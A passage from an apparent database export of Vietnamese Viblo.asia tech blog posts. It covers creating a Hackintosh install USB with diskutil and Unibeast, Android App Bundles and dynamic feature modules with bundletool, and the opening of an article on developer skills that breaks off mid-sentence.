tuy nhiên đó sẽ là phiên bản mới nhất.  Tải theo : [Bộ cài đặt MacOS](https://maclife.vn/mac-application/bo-cai-dat-mac) thì các bạn có thể tải bất cứ phiên bản MacOS nào mong muốn, cho dù đã cũ.\n\nỞ đây mình chọn phiên bản Mac 10.14\n\n![](https://images.viblo.asia/150939e9-0d74-479a-8da4-0b68154a09da.png)\n\nSau khi tải về, các bạn sẽ có 1 file .DMG như hình dưới\n\n![](https://images.viblo.asia/9600c26a-7303-466e-8924-bd04da89d1a5.png)\n\nMở lên, các bạn sẽ có file cài đặt từ Apple, kéo file đó vào thư mục application bên cạnh\n\n![](https://images.viblo.asia/cc574d01-d809-4f11-bf72-8bbc84cd29d0.png)\n\nVậy là xong bước 1\n\n### 2. Format USB \n\nChỉ riêng format USB trên MacOS cũng có 2 cách:\n\n+ Sử dụng Disk Utility\n+ Sử dụng Terminal\n\nTuy nhiên khuyến cáo là nên dùng cách Terminal, và trong bài này mình cũng sẽ sử dụng cách này. Format USB cần chia ra 2 phân vùng riêng biệt: \n\n+ Tuỳ chọn 1: Định dạng MBR với 1 phân vùng FAT32 để boot và một phân vùng HFS+J cho bộ cài MacOS.\n+ Tuỳ chọn 2: Định dạng GPT với 1 phân vùng HFS+J cho bộ cài MacOS (phân vùng để boot được tạo tự động gọi là phân vùng EFI).\n\nỞ đây, cũng khuyến cáo là nên sử dụng tuỳ chọn 1 :+1: Lí do: Định dạng MBR có thể sử dụng cho ổ cứng MBR và GPT. Còn nếu dùng tuỳ chọn 2 định dạng GPT thì chỉ có thể sử dụng cho ổ cứng định dạng GPT mà không thể đối với MBR.\n\nCắm USB của các bạn vào máy, bật Terminal lên, gõ lệnh: \n\n```\ndiskutil list\n```\n\nNhư máy của mình, nó sẽ hiện như sau: \n\n```\n/dev/disk0 (internal, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *120.0 GB   disk0\n   1:                        EFI EFI                     209.7 MB   disk0s1\n   2:                  Apple_HFS Sierra                  119.2 GB   disk0s2\n   3:                 Apple_Boot Recovery HD             650.0 MB   disk0s3\n\n/dev/disk1 (internal, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *500.1 GB   disk1\n   1:                        EFI EFI                     209.7 MB   disk1s1\n   2:                  Apple_HFS DATA                    499.8 GB   disk1s2\n\n/dev/disk2 (disk image):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:     Apple_partition_scheme                        +7.2 GB     disk2\n   1:        Apple_partition_map                         32.3 KB    disk2s1\n   2:                  Apple_HFS UltraEdit EL v18.00 ... 7.2 GB     disk2s2\n\n/dev/disk3 (external, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:     FDisk_partition_scheme                        *15.5 GB    disk3\n   1:                 DOS_FAT_32 CLOVER EFI              209.7 MB   disk3s1\n   2:                  Apple_HFS install_osx             15.3 GB    disk3s2\n```\n\nNhư các bạn có thể thấy, USB của mình là /dev/disk3 (external, physical)\n\n***Đối với các bạn chọn tuỳ chọn 1, gõ lệnh như nhau***: \n\n```\ndiskutil partitionDisk /dev/disk3 2 MBR FAT32 "CLOVER EFI" 200Mi HFS+J "install_osx" R\n```\n\nGiải thích: \n\n+ /dev/disk3 2 MBR: Chia USB làm 2 phân vùng theo kiểu MBR\n+ FAT32 "CLOVER EFI" 200Mi: Phân vùng thứ nhất định dạng FAT32 có tên là "CLOVER EFI" với dung lượng 200MB \n+ HFS+J "install_osx" R: Phân vùng thứ 2 định dạng HFS+J có tên là "install_osx" với dụng lượng còn lại trong USB\n\nSau khi chạy xong, Terminal sẽ hiện ra kết quả: \n\n```\n/dev/disk3 (external, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:     FDisk_partition_scheme                        *15.5 GB    disk3\n   1:                 DOS_FAT_32 CLOVER EFI              209.7 MB   disk3s1\n   2:                  Apple_HFS install_osx             15.3 GB    disk3s2\n```\n\n***Đối với các bạn chọn tuỳ chọn 2, gõ lệnh như nhau***: \n\n```\ndiskutil partitionDisk /dev/disk3 1 GPT HFS+J "install_osx" R\n```\n\nGiải thích: \n\n+ /dev/disk3 1 GPT: Chia USB làm 1 phân vùng theo kiểu GPT (phân vùng EFI tự động được tạo với dung lượng 200MB)\n+ HFS+J "install_osx" R: Phân vùng định dạng HFS+J có tên "install_osx" với dung lượng còn lại trong USB \n\nSau khi chạy xong, Terminal sẽ hiện ra kết quả: \n\n```\n/dev/disk3 (external, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *15.5 GB    disk3\n   1:                        EFI EFI                     209.7 MB   disk3s1\n   2:                  Apple_HFS install_osx             15.3 GB    disk3s2\n```\n\nVậy là xong bước 2 !!!\n### 3. Ghi dữ liệu cho 2 phân vùng sau khi format \n\nTruy cập địa chỉ: [tonymacx86 Tools](https://www.tonymacx86.com/resources/categories/tonymacx86-downloads.3/) , tải phiên bàn Unibeast tương ứng với bộ cài các bạn tải về ở bước 1. Trở lại bước 1, mình đã tải phiên bản MacOS 10.14 Mojave, nên bây giờ mình sẽ chọn phiên bản Unibeast 9.2.0\n\n![](https://images.viblo.asia/2c99796f-0092-42cd-9f92-3df034ed8733.png)\n\nSau khi tải thành công, giải nén file .zip các bạn được công cụ Unibeast. Kiểm tra lại bộ cài "Install macOS <tên phiên bản>.app" các bạn chắc chắn đã copy vào thư mục Application ở bước 1 chưa.\n\n![](https://images.viblo.asia/645ea1a6-af8e-4477-92ae-fc25b68f5391.png)\n\nMọi thứ OKE thì bật Unibeast lên thôi nào, Cứ continue...continue cho đến màn hình này: \n\n![](https://images.viblo.asia/5c3f84a2-cfef-4f3f-a865-ed1f1f27e10b.png)\n\nthì bấm chọn install_osx rồi continue tiếp\n\n![](https://images.viblo.asia/b4fa76c7-edc2-4466-9f40-afd836e72741.png)\n\nTại đây, Unibeast sẽ tự động bắt bộ cài được đặt trong Application. Đó là lí do tại sao bắt buộc bộ cài phải đặt trong thư mục Application, continue \n\n![](https://images.viblo.asia/0840b69d-f174-4a38-85a4-4043b22b187b.png)\n\nTại đây các bạn có 2 tuỳ chọn: \n\n+ UEFI boot mode: tuỳ chọn dành cho BIOS hỗ trợ chế độ boot UEFI và đang chạy chế độ này\n+ Legacy boot mode: tuỳ chọn dành cho BIOS hỗ trợ chế độ boot UEFI nhưng đang chạy chế độ Legacy hoặc BIOS cũ không hỗ trợ kiểu UEFI boot mode\n\nThì ở đây tuỳ cấu hình máy các, các bạn có thể vào BIOS kiểm tra xem máy mình đang hỗ trợ chế độ boot nào. Sau đó đưa ra cú click chính xác nhé. Tại đây mình chọn chế độ UEFI do máy mình có hỗ trợ và cũng đang chạy chế độ này, continue...continue, nếu Unibeast bắt nhập password xác nhận thì các bạn bấm password vào thôi. Sau đó là chờ đợi, quá trình này có thể diễn ra 20-25p tuỳ cấu hình máy. \n\n![](https://images.viblo.asia/87aa42cc-dade-4c85-87cc-9be04c331035.png)\n\n![](https://images.viblo.asia/39fee758-6067-4f4b-8f8e-f04273e9b46f.png)\n\nĐến đây là các bạn đã tạo thành công một chiếc USB cài Hackintosh theo cách số 2. Nhớ đặt BIOS theo chuẩn các bạn chọn trong lúc dùng Unibeast nhé !!!\n\n\n\n-----\n\n**Trên đây mình đã hước dẫn các bạn 2 cách để các bạn có thể tạo đượcc 1 chiếc USB cài Hackintosh, còn một cách nữa hẹn các bạn trong phần 2 nhé :muscle::muscle::muscle:**	Chào các bạn, Như đề cập trong phần tiêu đề thì trong bài viết này mình sẽ giới thiệu cho các bạn về các cách có thể tạo 1 chiếc USB cài đặt Hackintosh: Cụ thể về Hackintosh là gì các bạn có thể xem qua trong bài viết trước đó của mình Giới thiệu về Hackintosh :laughing:.\n\nVề tổng quan, chúng ta sẽ có 3 cách để có thể tạo được USB này:\n+ Cách 1: Bung file DMG đã làm tất cả mọi thứ từ A đến Z và...	{https://images.viblo.asia/a327e72b-e457-4c75-b88d-10b8c9e57d06.png,https://images.viblo.asia/2f0b6130-e0b6-4c83-8dc5-d3bc3b594da1.png,https://images.viblo.asia/b674bbe3-a42e-476c-a159-6d98f7501b9c.png,https://images.viblo.asia/5d716e84-f2a4-45e0-af12-13bd9d118aac.png,https://images.viblo.asia/9615d65c-5a61-4a55-9393-7467b6b27a80.png,https://images.viblo.asia/8022b5cd-2354-4dd6-904e-674f03b5b180.png,https://images.viblo.asia/90017394-b2fd-4531-8dfb-e6315cfa7d54.png,https://images.viblo.asia/b36a4c0a-28e5-4633-bd91-017d6ffae012.png,https://images.viblo.asia/707dc6d8-80ca-44bd-ae1d-d9eaa62755d7.png,https://images.viblo.asia/150939e9-0d74-479a-8da4-0b68154a09da.png,https://images.viblo.asia/9600c26a-7303-466e-8924-bd04da89d1a5.png,https://images.viblo.asia/cc574d01-d809-4f11-bf72-8bbc84cd29d0.png,https://images.viblo.asia/2c99796f-0092-42cd-9f92-3df034ed8733.png,https://images.viblo.asia/645ea1a6-af8e-4477-92ae-fc25b68f5391.png,https://images.viblo.asia/5c3f84a2-cfef-4f3f-a865-ed1f1f27e10b.png,https://images.viblo.asia/b4fa76c7-edc2-4466-9f40-afd836e72741.png,https://images.viblo.asia/0840b69d-f174-4a38-85a4-4043b22b187b.png,https://images.viblo.asia/87aa42cc-dade-4c85-87cc-9be04c331035.png,https://images.viblo.asia/39fee758-6067-4f4b-8f8e-f04273e9b46f.png}	1	Tạo USB cài đặt Hackintosh (P1)	{macos,hackintosh,tutorial}	0	f	2022-12-18 15:33:38.424+00	2022-12-18 15:33:38.424+00
31896	# App bundle và Dynamic delivery\n\n## I. Các khái niệm\n### 1. Giới thiệu\nỞ Google I/O 2018, một định dạng xuất bản mới đã được giới thiệu cho các ứng dụng Android có tên là Android App Bundle.\n\nĐây là một định dạng tải lên mới bao gồm tất cả các resource và code đã được compile, nhưng chưa tạo APK và ký vào Google Play.\n\n Nó sẽ ảnh hưởng đến cách chúng ta xây dựng và cấu trúc các ứng dụng của chúng ta theo một định dạng modules\nDạng format sẽ là .aab\n\n### 2. Lợi ích\n- **Kích thước ứng dụng nhỏ hơn:** dùng kĩ thuật Split Apk, các gói riêng biệt được cài đặt trên thiết bị của người dùng theo yêu cầu. Trung bình một app publish với app bundle kích thước sẽ nhỏ hơn 20%\n\n- **Không còn phải quản lý nhiều file APK:** không còn phải build, sign và quản lý nhiều APK để hỗ trợ nhiều loại devices và người dùng sẽ chỉ phải down file kích thước nhỏ hơn. Ví dụ giờ sẽ không phải tạo nhiều APK cho nhiều cỡ màn hình.\n\n- **Dynamic Delivery:** chỉ tải code và resource người dùng cần cho app của họ, dùng app bundle để gen các file apk cho mỗi cấu hình của thiết bị sử dụng. Ví dụ nếu Tiếng Anh là ngôn ngữ chính thì sẽ không cần các ngôn ngữ khác\n\n- **Tối ưu cho việc tích hợp Instant app:** người dùng có thể chạy ứng dụng của bạn ngay lập tức mà không phải cài đặt ứng dụng\n\n- **Module Dynamic Feature:** những module, tính năng mà người dùng chưa cần khi lần đầu cài app. Sử dụng Play Core Library, app có thể request để tải về thêm những tính năng cần.\n\n### 3. Cấu trúc\n Với apk, người dùng có thể cài đặt trực tiếp lên thiết bị, nhưng với app bunlde thì lại không. App bunlde chứa một số nội dung mà apk không có. \n \n![](https://images.viblo.asia/e4f827f5-3024-4159-acc9-8763afd95709.png)\n\n- base/, feature1/, feature2/: đây là các module của app. Module cơ bản của app ở trong  base/. Để cầu hình đường dẫn cho feature1/, feature2/, ta cấu hình trong manifest của từng module, với thẻ split\n\n- manifest/: không giống như APK, gói ứng dụng lưu trữ tệp AndroidManifest.xml của mỗi mô-đun trong thư mục riêng biệt này.\n\n- dex /: Không giống như APK, gói ứng dụng lưu trữ các tệp DEX cho mỗi mô-đun trong thư mục riêng biệt này.\n\n- res /, lib / và assets /: Các thư mục này giống hệt với các thư mục trong APK thông thường. Khi bạn tải lên gói ứng dụng của mình, Google Play sẽ chỉ kiểm tra các thư mục và gói này các tệp đáp ứng cấu hình thiết bị đích, trong khi vẫn giữ đường dẫn tệp.\n…\n\n### 4. .Aab vs apks\n### Multiple APKs = apks\n\nMultiapks:\n\n![](https://images.viblo.asia/16ca5a2d-6e5a-434e-a3de-197cc264b6ba.png)\n\nApp bundle:\n\n![](https://images.viblo.asia/37eb17f7-da3c-4b16-9b5a-4f16827a64f5.png)\n\nSo sánh\n\n![](https://images.viblo.asia/81db14a3-5148-4a0d-8e9d-60e5fce01abc.png)\n\n### 5. Dynamic delivery (Phân phối động)\n### a. Giải thích\nCác tính năng,  cấu hình ban đầu: ngôn ngữ, độ phân giải màn hình, cấu trúc CPU\n\n![](https://images.viblo.asia/b41f9ec5-29d8-4073-89f2-1bea9ff07f29.png)\n\n\nKhi được cài lên device, apk sẽ lấy tất cả các tính năng, cấu hình đó để đưa vào apk, còn Dynamic delivery chỉ chọn những cái phù hợp để đưa vào\n\n![](https://images.viblo.asia/f2bb1c7c-8d05-4901-9441-bda836a20fad.png)\n\n\n### Split apk được chia làm 3 loại\n- **Base apk:** APK này chứa code và resource mà tất cả các APK phân tách khác có thể truy cập và cung cấp chức năng cơ bản cho ứng dụng của bạn. Khi người dùng download ứng dụng của bạn chắc chắn có file APK này\n\n- **Configuration apk:** Mỗi APK trong số này bao gồm native libraries và resource cho từng cấu hình device cụ thể, nó sẽ tối ưu hóa nội dung APK theo dựa theo :\n\nNgôn ngữ\n\nMật độ màn hình\n\nKiến trúc CPU\n\nKhi bạn build abb, theo mặc định, tất cả các phần tách sẽ được tạo, nhưng trong build.gradle, ta có thể khai báo những phần tách nào sẽ được tạo:\n\n```\nbundle {\n        language {\n            // Specifies that the app bundle should not support\n            // configuration APKs for language resources. These\n            // resources are instead packaged with each base and\n            // dynamic feature APK.\n            enableSplit = false\n        }\n        density {\n            // This property is set to true by default.\n            enableSplit = true\n        }\n        abi {\n            // This property is set to true by default.\n            enableSplit = true\n        }\n    }\n```\n\nBan đầu, các thuộc tính này sẽ được đặt thành true. Tuy nhiên, đặt một thành false có nghĩa là nó không hỗ trợ phân tách phần đó trong APK config, có nghĩa là nó sẽ được đóng gói trong Base APK hoặc Dynamic-Feature APK\n\n- **Dynamic feature APKs:** Mỗi APK này chứa code và resource không bắt buộc khi ứng dụng của bạn được cài đặt lần đầu, nhưng có thể được tải xuống và cài đặt sau.\n\n### 6. Dynamic feature module\n\nDynamic feature module cho phép bạn tách các tính năng và tài nguyên nhất định khỏi module cơ sở của ứng dụng và đưa chúng vào aab. Thông qua Dynamic Delivery, sau này người dùng có thể tải xuống và cài đặt các thành phần đó theo yêu cầu sau khi họ đã cài đặt APK cơ sở của ứng dụng của bạn.\n\nVí dụ, một ứng dụng nhắn tin văn bản bao gồm chức năng chụp và gửi tin nhắn hình ảnh, nhưng chỉ một phần nhỏ người dùng gửi tin nhắn hình ảnh. Có thể có ý nghĩa khi đưa tin nhắn hình ảnh làm nó thành Dynamic feture module có thể tải xuống. Bằng cách đó, tải xuống ứng dụng ban đầu nhỏ hơn cho tất cả người dùng và chỉ những người dùng gửi tin nhắn hình ảnh đó mới cần tải xuống thành phần bổ sung đó.\n\n## II. Code\n### 1. Dynamic feature module\n### a. Tạo một module động\n\nAndroid hỗ trợ tạo module động như sau\n\n![](https://images.viblo.asia/73e4de4a-a3af-4689-8a7b-83263f837b53.png)\n\nSau đó có thể thay đổi Module name, package name, api level\n\n![](https://images.viblo.asia/685deeac-123f-426d-b35c-cc5f24d79d71.png)\n\nCó 2 thuộc tính quan trọng\n- **Enable on-demand:** có cho phép down module ở lần đầu tiên cài app hay không. Nếu không thì khi nào người dùng request thì mới down xuống\n- **Fusing:** nếu muốn module này dùng được trên các thiết bị chạy API 20 trở xuống (Android 4.4) và thêm nó vào multi-APKs\n\nTạo xong thì sẽ có file AndroidManifest.xml của module\n```\n<?xml version="1.0" encoding="utf-8"?>\n<manifest xmlns:android="http://schemas.android.com/apk/res/android"\n         xmlns:dist="http://schemas.android.com/apk/distribution"\n         package="com.example.dynamic_feature"\n         split="dynamic_feature">\n\n   dist:module\n           dist:onDemand="true"\n           dist:title="@string/title_dynamic_feature">\n       dist:fusing dist:include="true"/>\n   </dist:module>\n\n</manifest>\n```\n\nSau đó Android sẽ tự thêm cho ta:\n- Vào thẻ include trong setting.gradle tên module mới\n```\ninclude ':app', ':dynamic_feature', ':dynamic_feature2'\n```\n\n- Trong build.gradle của module app, sẽ thêm trường, nơi ta sẽ định nghĩa các module\n\n```\ndynamicFeatures = [":dynamic_feature", ":dynamic_feature2"]\n```\n\n- Trong build.gralde của dynamic module\n```\ndependencies {\n   implementation fileTree(dir: 'libs', include: ['*.jar'])\n\n// Khai báo phụ thuộc vào base module app\n   implementation project(':app')\n}\n```\n\n### b. Down một module động\n\n#### - Include Play Core Library\n```\ndependencies {\n    implementation 'com.google.android.play:core:1.3.4'\n}\n```\n\n#### - Request một demand cho dynamic feature module\n Có hai cách: \nSử dụng SplitInstallManager.startInstall (): Ứng dụng của bạn cần ở foreground để gửi yêu cầu.\n\nKhi ứng dụng của bạn yêu cầu một mô-đun theo yêu cầu, Thư viện Play Core sẽ thực hiện theo kiểu không đồng bộ.\n\nĐó là, nó sẽ gửi yêu cầu tải mô-đun xuống nền tảng, nhưng nó không theo dõi xem việc cài đặt có thành công hay không.\n\nVì vậy, bạn có trách nhiệm theo dõi trạng thái yêu cầu (giải thích sau).\nSplitInstallManager.deferredInstall(): cài module khi ở background. Với cách này thì ta không thể theo dõi tiến trình. Vì vậy trước khi truy cập vào một module đã chỉ định cài đặt trì hoãn, ta nên kiểm tra module đã được cài đặt hay chưa.\n\nTa có thể kiểm soát state của demand (xem code), cancel download, uninstall module, ...\n\n\n### 2. Sử dụng bundle tool\n#### a.Định nghĩa\nSau khi bạn xây dựng Gói ứng dụng Android, bạn nên kiểm tra cách Google Play sử dụng nó để tạo APK và cách các APK đó hoạt động khi được triển khai cho thiết bị.\n\n  Có hai cách bạn nên xem xét việc kiểm tra gói ứng dụng của mình: cục bộ bằng cách sử dụng công cụ dòng lệnh bundletool và thông qua Google Play bằng cách tải gói của bạn lên Play Console và sử dụng test track.\n\n  Trang này giải thích cách sử dụng bundletool để kiểm tra gói ứng dụng của bạn cục bộ.\n#### b. Công dụng\n#### - Gen set các APKs từ app bundle\n\n```\n bundletool build-apks \n \n **--bundle**=/home/nguyen.ngoc.trungc/AndroidStudioProjects/Training/Training_AppBunlde/app/build/outputs/bundle/debug/app.aab \n \n **--output**=/home/nguyen.ngoc.trungc/AndroidStudioProjects/Training/Training_AppBunlde/app/build/outputs/bundle/debug/my_app.apks\n```\n\n![](https://images.viblo.asia/5e31a65f-d28e-48bc-887b-c86baf35e38b.png)\n\n\nKết quả: \n\n![](https://images.viblo.asia/6afc46b3-365d-4434-a3e0-a8e4d543eaac.png)\n\n![](https://images.viblo.asia/ea09802c-c152-4ea2-8034-72fedb81ca15.png)\n\n\n==> Không cài được, chia theo ngôn ngữ, độ phân giải màn hình\n\nNgoài ra còn có thể setting thêm nhiều thuộc tính khác\n\n![](https://images.viblo.asia/a2064890-a019-42b3-9851-23cffea4e505.png)\n\n\n#### -Cài đặt APK từ APK Set tương thích với thiết bị được kết nối.\n```\nbundletool install-apks --apks=/MyApp/my_app.apks\n```\n\nVí dụ: nếu bạn có thiết bị được kết nối chạy Android 5.0 (API 21) trở lên, bundletool sẽ đẩy base APK, dynamic feature APKs và configuration APKs cần thiết để chạy ứng dụng của bạn trên thiết bị đó.\n\nNgoài ra, nếu thiết bị được kết nối của bạn đang chạy Android 4.4 (API 20) hoặc thấp hơn, bundletool sẽ tìm một APK đa tương thích và triển khai nó cho thiết bị của bạn.\n\nNhiều thiết bị thì dùng --device-id=serial-number\n\n\n#### -Trích xuất (các) APK từ Bộ APK tương thích với một thiết bị nhất định.\n\n#### --connected-device\nĐể ngôn ngữ máy là Tiếng Anh - xxhdpi\n\n![](https://images.viblo.asia/f6fe1d3e-f84c-47cc-b18e-7d1cf72d2efc.png)\n\nĐể ngôn ngữ máy là Tiếng Việt - xxhdpi\n\n![](https://images.viblo.asia/de4422d9-eb8c-42a0-b0e0-3bded6dd6a2e.png)\n\nĐộ phân giải màn hình khác - xhdpi\n\n![](https://images.viblo.asia/cbe85758-aa14-42c5-bd38-fd8475db3fe0.png)\n\n\n#### -Trích xuất thông số thiết bị dưới dạng tệp JSON.\n```\nbundletool get-device-spec --output=/tmp/device-spec.json\n```\n```\n{\n  "supportedAbis": ["x86"],\n  "supportedLocales": ["vi"],\n  "deviceFeatures": ["reqGlEsVersion=0x20000", "android.hardware.audio.output", "android.hardware.camera", "android.hardware.camera.any", "android.hardware.faketouch", "android.hardware.fingerprint", "android.hardware.location", "android.hardware.location.gps", "android.hardware.location.network", "android.hardware.microphone", "android.hardware.screen.landscape", "android.hardware.screen.portrait", "android.hardware.sensor.accelerometer", "android.hardware.sensor.ambient_temperature", "android.hardware.sensor.barometer", "android.hardware.sensor.compass", "android.hardware.sensor.gyroscope", "android.hardware.sensor.light", "android.hardware.sensor.proximity", "android.hardware.sensor.relative_humidity", "android.hardware.telephony", "android.hardware.telephony.gsm", "android.hardware.touchscreen", "android.hardware.touchscreen.multitouch", "android.hardware.touchscreen.multitouch.distinct", "android.hardware.touchscreen.multitouch.jazzhand", "android.hardware.wifi", "android.software.app_widgets", "android.software.backup", "android.software.connectionservice", "android.software.device_admin", "android.software.home_screen", "android.software.input_methods", "android.software.live_wallpaper", "android.software.managed_users", "android.software.midi", "android.software.print", "android.software.voice_recognizers", "android.software.webview", "com.google.android.feature.EXCHANGE_6_2", "com.google.android.feature.GOOGLE_BUILD", "com.google.android.feature.GOOGLE_EXPERIENCE"],\n  "screenDensity": 480,\n  "sdkVersion": 25\n}\n```\nRồi có thể dùng file JSON trên để gen apk cho thiết bị:\n```\nbundletool build-apks --device-spec=/MyApp/pixel2.json\n--bundle=/MyApp/my_app.aab --output=/MyApp/my_app.apks\n```\n\n#### Ngoài ra còn có thể extract apk từ apks có sẵn, vs file JSON đã gen, đo kích thước download\n\n-----------------------------------------------------------------------------------------\n\nXem thêm các bài viết khác của mình tại Viblo\n\n- [Service trong Android - Những khái niệm cơ bản](https://viblo.asia/p/service-trong-android-nhung-khai-niem-co-ban-yMnKMdrA57P)\n-  [Deeplink đến Dynamic link trong Android - Những điều cần biết](https://viblo.asia/p/deeplink-den-dynamic-link-trong-android-nhung-dieu-can-biet-Do754GGelM6)   \n- [Retrofit và OK HTTP trong Android](https://viblo.asia/p/retrofit-va-ok-http-trong-android-3Q75wG9D5Wb)\n- [Location trong Android](https://viblo.asia/p/location-trong-android-vyDZOp8klwj)\n\nTại kipalog: \n    \n  -  [Code cùng Trung - kipalog](https://kipalog.com/users/Code%20c%C3%B9ng%20Trung/mypage)\n\n Sắp tới mình có ra mắt blog cá nhân , các bạn hãy theo dõi để tiếp tục cập nhật những kiến thức mới nhé. Cảm ơn các bạn :D\n \n   - Blog trên Facebook - Code cùng Trung - Chia sẻ để tiến bước :\n    \n     https://www.facebook.com/codecungtrung\n    \n   - Website - Code cùng Trung - Chia sẻ để tiến bước:\n    \n     https://codecungtrung.com/\n\nNgoài ra, nếu bạn muốn viết một blog, chạy một trang web thì **host** là một phần không thể thiếu, bên cạnh **domain**. [**Hawkhost**](https://my.hawkhost.com/aff.php?aff=13584) là một host rất tốt, được nhiều người sử dụng, server ổn định, support nhiệt tình, nhiều **khuyến mại** nữa. Mình cũng đang sử dụng cho blog của mình - đang trong giai đoạn phát triển :grinning: . \n\nCác bạn có thể xem thêm và đăng kí tại link:\n\n   - [Hawkhost - một host rất đáng để sử dụng]( https://my.hawkhost.com/aff.php?aff=13584)	App bundle và Dynamic delivery\n\nI. Các khái niệm\n1. Giới thiệu\nỞ Google I/O 2018, một định dạng xuất bản mới đã được giới thiệu cho các ứng dụng Android có tên là Android App Bundle.\n\nĐây là một định dạng tải lên mới bao gồm tất cả các resource và code đã được compile, nhưng chưa tạo APK và ký vào Google Play.\n\n Nó sẽ ảnh hưởng đến cách chúng ta xây dựng và cấu trúc các ứng dụng của chúng ta th...	{https://images.viblo.asia/e4f827f5-3024-4159-acc9-8763afd95709.png,https://images.viblo.asia/16ca5a2d-6e5a-434e-a3de-197cc264b6ba.png,https://images.viblo.asia/37eb17f7-da3c-4b16-9b5a-4f16827a64f5.png,https://images.viblo.asia/81db14a3-5148-4a0d-8e9d-60e5fce01abc.png,https://images.viblo.asia/b41f9ec5-29d8-4073-89f2-1bea9ff07f29.png,https://images.viblo.asia/f2bb1c7c-8d05-4901-9441-bda836a20fad.png,https://images.viblo.asia/73e4de4a-a3af-4689-8a7b-83263f837b53.png,https://images.viblo.asia/685deeac-123f-426d-b35c-cc5f24d79d71.png,https://images.viblo.asia/5e31a65f-d28e-48bc-887b-c86baf35e38b.png,https://images.viblo.asia/6afc46b3-365d-4434-a3e0-a8e4d543eaac.png,https://images.viblo.asia/ea09802c-c152-4ea2-8034-72fedb81ca15.png,https://images.viblo.asia/a2064890-a019-42b3-9851-23cffea4e505.png,https://images.viblo.asia/f6fe1d3e-f84c-47cc-b18e-7d1cf72d2efc.png,https://images.viblo.asia/de4422d9-eb8c-42a0-b0e0-3bded6dd6a2e.png,https://images.viblo.asia/cbe85758-aa14-42c5-bd38-fd8475db3fe0.png}	1	App bundle và Dynamic delivery trong Android	{androidappbundle,android}	0	f	2022-12-18 15:33:38.46+00	2022-12-18 15:33:38.46+00
31809	![](https://images.viblo.asia/a25327b1-181c-4d44-87ca-42e3ef5f6f93.jpg)\n# Giới thiệu\nCó rất nhiều thứ quan trọng cần học để trở thành một developer: thuật toán, cấu trúc dữ liệu, các ngôn ngữ lập trình,... không thể đếm xuể được. Đấy là vấn đề trước khi chúng ta thực sự chọn một ngôn ngữ lập trình để bắt đầu. Go đang là xu hướng hiện nay. JavaScript đang là ngôn ngữ phổ biến nhất năm 2018. Hơn 3 tỷ thiết bị đang chạy trên Java. Wow, thật khó khăn để chọn một ngôn ngữ lập trình phù hợp khi bạn còn chưa biết rằng nó dùng để làm gì.\n\nBài viết này không nói về các chủ đề trên bởi vì chúng đã được dạy thường xuyên tại các trường đại học chuyên ngành CNTT hoặc các khoá học tương tự. Bài viết này sẽ nói về các công cụ và kĩ năng mà chúng đã không được dạy tại trường, và nó sẽ tạo ra một sự khác biệt rõ ràng khi bạn có một công việc đầu tiên.\n\n# Git\n![](https://images.viblo.asia/e9e6e34e-82a5-4c8f-9017-25f1e2f5b6e4.png)\nĐây chính xác là một công cụ hơn là một kĩ năng. Không quan tâm bạn là developer mảng nào hay bạn đang sử dụng ngôn ngữ gì, chắc chắn bạn sẽ sử dụng nó hằng ngày đấy. \n\nGit là một công cụ quản lí mã nguồn (Source Control Manager hay SCM). Nói cách khác, Git cho phép bạn làm việc với nhiều phiên bản code khác nhau. Nó cung cấp các công cụ để bạn có thể làm việc với nhiều người trong cùng một project một cách thoải mái nhất và không gặp rắc rối với việc conflict code với nhau.\n\nNếu như bạn đang làm việc với project của chính mình, sẽ là một ý tưởng tốt nếu sử dụng Git vì nhiều lý do khác nhau. Hiển nhiên là bạn có thể lưu trữ code của bạn ở trên cloud miễn phí. Nhiều công ty hỗ trợ public repositories như GitHub, GitLab, BitBucket,.... Nếu làm việc nhóm hay nhảy vào dự án công ty thì trước sau gì bạn cũng phải dùng Git thôi, nên tốt hơn hết là bạn hãy học cách sử dụng nó trước đi.\n\nMột nguồn học tuyệt vời để học Git là learngitbranching. Trang web này thể hiện trực quan, diễn tả cách hoạt động của từng command nên nó sẽ giúp ích bạn rất nhiều trong việc học Git. Bạn có thể học những thứ cơ bản về Git chỉ trong 1 ngày, nhưng bạn sẽ phải khám phá những command hữu ích trong một khoảng thời gian dài.\n\n\n# Cách giao tiếp\n![](https://images.viblo.asia/44fdc56b-33f7-4056-a839-6e34e629053a.jpg)\n\nMột kĩ năng mềm quan trọng đang bị xem nhẹ chính là cách giao tiếp với mọi người. Những lập trình viên như chúng ta đang tập trung quá nhiều vào các khía cạnh công nghệ mà đôi khi chúng ta quên mất rằng để đạt được thứ tốt nhất, chúng ta phải làm việc với nhiều người khác. Có rất nhiều thứ để cải thiện khi nói về việc giao tiếp. Tôi sẽ chỉ ra một điều quan trọng nhất, dành cho các developers, đó chính là làm sao để mô tả lại vấn đề cho người khác hiểu. Bạn sẽ phải thường xuyên nhờ người khác giúp đỡ khi bạn gặp khó khăn, và để nhận được sự giúp đỡ thì trước tiên bạn phải mô tả lại vấn đề của bạn trước đã.\n\nĐồng nghiệp của bạn cũng bận rộn như bạn vậy, họ cũng phải lo nghĩ nhiều việc. Vậy nên đừng đưa câu hỏi không đầu không đuôi với họ, thay vào đấy hãy cho họ biết bạn đã gặp vấn đề như thế nào, đã thử giải quyết bằng cách nào trước khi nhờ tới sự giúp đỡ.\n\n> **Đừng làm như thế này**\n> >  Này [anh A], cái [service] này không chạy khi tôi run [command], anh giúp tôi được không ?\n\n> **Hãy làm như thế này**\n> > Này [anh A], tôi cần vài lời khuyên. Hiện tại tôi đang làm việc với [service].  Đáng lẽ ra nó phải [như này] nhưng nó lại thành ra [như này]. Tôi đã đọc docs và tôi không thể tìm ra được issues cho vấn đề đó. VÌ anh làm việc quen với [service], anh có thể giúp tôi một tay khi anh rảnh được không? Cà phê tôi mời nhé.\n\nĐồng nghiệp không phải lúc nào cũng có nhiều kinh nghiệm với thứ mà bạn đang làm. Vậy nên trở nên thân thiện và đưa ra bối cảnh trước khi hỏi người khác sẽ khiến bạn cảm thấy cuộc trò chuyện diễn ra trôi chảy hơn, và vấn đề của bạn cũng được giải quyết một cách nhanh chóng hơn.\n\nĐể cải thiện điều này, hãy thử nói chuyện với chính mình khi 